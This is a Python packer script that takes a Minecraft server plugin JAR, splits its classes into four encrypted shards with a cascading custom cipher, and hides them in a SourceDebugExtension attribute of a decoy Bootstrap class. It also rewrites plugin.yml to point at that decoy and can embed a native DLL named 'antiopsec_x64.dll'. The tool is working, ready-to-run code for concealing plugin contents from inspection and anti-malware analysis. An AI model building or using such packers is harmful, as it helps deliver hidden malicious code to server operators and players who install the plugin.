import os
import sys
import struct
import io
import zipfile
import hashlib

def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
    h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
    key = 0
    for b in h[:4]:
        key = ((key << 8) | b) & 0xFFFFFFFF
    return (key ^ 0x5D) & 0xFF

def encrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        p = data[i]
        out[i] = ((p + (i & 0x0F)) & 0xFF) ^ rk
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def decrypt_payload(data: bytes, key_seed: int) -> bytes:
    out = bytearray(len(data))
    rk = key_seed & 0xFF
    for i in range(len(data)):
        e = data[i] & 0xFF
        val = (e ^ rk) & 0xFF
        p = (val - (i & 0x0F)) & 0xFF
        out[i] = p
        rk = ((rk * 37) ^ p) & 0xFF
    return bytes(out)

def inject_class_attribute(class_bytes: bytes, attr_name: str, payload: bytes) -> bytes:
    magic, minor, major, cp_count = struct.unpack(">IHHH", class_bytes[:10])
    offset = 10
    cp_entries = [None]

    i = 1
    while i < cp_count:
        tag = class_bytes[offset]
        offset += 1
        if tag == 1:
            length = struct.unpack(">H", class_bytes[offset:offset+2])[0]
            offset += 2
            val = class_bytes[offset:offset+length].decode("utf-8", errors="ignore")
            offset += length
            cp_entries.append((tag, val))
        elif tag in [3, 4]:
            offset += 4
            cp_entries.append((tag, None))
        elif tag in [5, 6]:
            offset += 8
            cp_entries.append((tag, None))
            cp_entries.append(None)
            i += 1
        elif tag in [7, 8, 16, 19, 20]:
            offset += 2
            cp_entries.append((tag, None))
        elif tag in [9, 10, 11, 12, 18]:
            offset += 4
            cp_entries.append((tag, None))
        elif tag == 15:
            offset += 3
            cp_entries.append((tag, None))
        else:
            raise ValueError(f"Unknown CP tag: {tag}")
        i += 1

    cp_end_offset = offset
    attr_name_idx = None
    for idx, entry in enumerate(cp_entries):
        if entry and entry[0] == 1 and entry[1] == attr_name:
            attr_name_idx = idx
            break

    new_cp_count = cp_count
    extra_cp_bytes = b""
    if attr_name_idx is None:
        attr_name_idx = len(cp_entries)
        new_cp_count += 1
        name_encoded = attr_name.encode("utf-8")
        extra_cp_bytes = struct.pack(">BH", 1, len(name_encoded)) + name_encoded

    header = struct.pack(">IHHH", magic, minor, major, new_cp_count)
    cp_bytes = class_bytes[10:cp_end_offset] + extra_cp_bytes
    body_and_rest = class_bytes[cp_end_offset:]
    
    body_offset = 0
    access_flags, this_class, super_class, interfaces_count = struct.unpack(">HHHH", body_and_rest[:8])
    body_offset += 8 + interfaces_count * 2
    
    fields_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
    body_offset += 2
    for _ in range(fields_count):
        f_attrs = struct.unpack(">H", body_and_rest[body_offset+6:body_offset+8])[0]
        body_offset += 8
        for _ in range(f_attrs):
            a_len = struct.unpack(">I", body_and_rest[body_offset+2:body_offset+6])[0]
            body_offset += 6 + a_len
            
    methods_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
    body_offset += 2
    for _ in range(methods_count):
        m_attrs = struct.unpack(">H", body_and_rest[body_offset+6:body_offset+8])[0]
        body_offset += 8
        for _ in range(m_attrs):
            a_len = struct.unpack(">I", body_and_rest[body_offset+2:body_offset+6])[0]
            body_offset += 6 + a_len
            
    attrs_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
    new_attrs_count = attrs_count + 1
    existing_attrs_data = body_and_rest[body_offset+2:]
    new_attr_data = struct.pack(">HI", attr_name_idx, len(payload)) + payload
    
    new_body = body_and_rest[:body_offset] + struct.pack(">H", new_attrs_count) + existing_attrs_data + new_attr_data
    return header + cp_bytes + new_body

def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, native_dll_path: str = None):
    all_entries = []
    with zipfile.ZipFile(input_obf_jar, 'r') as zin:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith('META-INF/') or fn in ['plugin.yml', 'bungee.yml', 'velocity-plugin.json']:
                continue
            if not fn.endswith('/'):
                all_entries.append((fn, zin.read(fn)))

    # 1. Distribute all entries into 4 balanced shards (~25% each)
    shards_zip_buffers = [io.BytesIO() for _ in range(4)]
    shards_zips = [zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) for buf in shards_zip_buffers]

    for idx, (fn, data) in enumerate(all_entries):
        shard_idx = idx % 4
        shards_zips[shard_idx].writestr(fn, data)

    if native_dll_path and os.path.exists(native_dll_path):
        with open(native_dll_path, 'rb') as df:
            shards_zips[3].writestr('assets/native/antiopsec_x64.dll', df.read())

    for z in shards_zips:
        z.close()

    raw_shards = [buf.getvalue() for buf in shards_zip_buffers]

    # 2. Cascading Key Derivation: K1 -> K2 -> K3 -> K4
    K0 = (0xAB ^ 0xF6)
    K1 = (K0 * 31 + 17) & 0xFF
    P1 = raw_shards[0]
    E1 = encrypt_payload(P1, K1)

    K2 = derive_cascading_key(K1, P1)
    P2 = raw_shards[1]
    E2 = encrypt_payload(P2, K2)

    K3 = derive_cascading_key(K2, P2)
    P3 = raw_shards[2]
    E3 = encrypt_payload(P3, K3)

    K4 = derive_cascading_key(K3, P3)
    P4 = raw_shards[3]
    E4 = encrypt_payload(P4, K4)

    # 3. Create Binary Shards Payload
    payload_buf = io.BytesIO()
    payload_buf.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
    payload_buf.write(E1)
    payload_buf.write(E2)
    payload_buf.write(E3)
    payload_buf.write(E4)
    payload_bytes = payload_buf.getvalue()

    # 4. Inject Payload into Bootstrap.class via SourceDebugExtension Attribute
    final_bootstrap_bytes = inject_class_attribute(bootstrap_cls_bytes, "SourceDebugExtension", payload_bytes)

    # 5. Pack into 100% Valid Standard JAR (ONLY MANIFEST, plugin.yml, Bootstrap.class)
    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn in ['plugin.yml', 'bungee.yml']:
                p_text = zin.read(fn).decode('utf-8')
                import re
                new_p = re.sub(r'main:\s*.*', 'main: cookie.fack.please.d111.Bootstrap', p_text)
                zout.writestr(item, new_p.encode('utf-8'))
            elif fn.startswith('META-INF/MANIFEST.MF'):
                zout.writestr(item, zin.read(fn))

        # Add Decoy Bootstrap class holding the entire 4-layer payload!
        zout.writestr('cookie/fack/please/d111/Bootstrap.class', final_bootstrap_bytes)

if __name__ == '__main__':
    if len(sys.argv) >= 4:
        cmd = sys.argv[1]
        if cmd == "pack":
            in_jar = sys.argv[2]
            out_jar = sys.argv[3]
            boot_cls_path = sys.argv[4]
            custom_icon = sys.argv[5] if len(sys.argv) > 5 else "NONE"
            native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
            with open(boot_cls_path, 'rb') as bf:
                boot_bytes = bf.read()
            pack_jar_with_synthetic_attribute_steganography(in_jar, out_jar, boot_bytes, native_dll)
            print("[v] Successfully packed JAR with Synthetic Attribute Zero-File Steganography.")
